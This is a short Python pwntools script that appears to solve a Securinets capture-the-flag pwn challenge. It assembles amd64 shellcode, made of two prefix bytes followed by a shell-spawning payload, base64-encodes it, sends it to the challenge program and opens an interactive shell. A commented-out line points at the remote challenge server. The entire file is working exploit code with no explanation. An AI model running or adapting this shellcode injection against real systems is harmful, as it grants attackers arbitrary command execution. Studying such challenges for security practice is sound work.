from pwn import *

from pwn import *
from base64 import b64encode
p=process("python3 main.py".split(" "))
#p=remote("pwn-14caf623.p1.securinets.tn",9001)
context.arch="amd64"

#shellcode=asm("pop r10")
#shellcode+=asm("mov rax,0x11223344\n")
shellcode = b"\x63\xc8"
shellcode += asm(shellcraft.sh())
#shellcode=b"b"*10
print("disas :")
print(disasm(shellcode))

p.sendline(b64encode(shellcode))
p.interactive()
